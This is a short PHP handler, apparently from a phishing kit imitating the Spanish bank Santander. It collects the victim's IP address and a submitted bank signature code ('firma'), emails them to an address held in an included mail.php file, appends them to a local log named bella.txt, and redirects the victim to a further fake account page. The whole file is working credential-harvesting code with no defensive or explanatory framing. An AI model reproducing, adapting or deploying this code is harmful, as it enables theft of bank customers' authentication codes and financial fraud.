<?
include '../mail.php';
$ip = getenv("REMOTE_ADDR");
$message .= "| IP : $ip   -----------\n";
$message .= "Code Firma :  ".$_POST['firma']."\n";
$message .= "Th3 MasT3r Z --------------------- \n";

$subject = "| SANTA Firma | $ip |";
$from = "From: SPAIN <tmz@Localhost.com>";
mail($send,$subject,$message,$from);


$file = fopen("../../bella.txt", 'a');
fwrite($file, $message);

echo "<script>window.top.location.href = \"../account1/index.html?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." \"; </script>";

?>
}
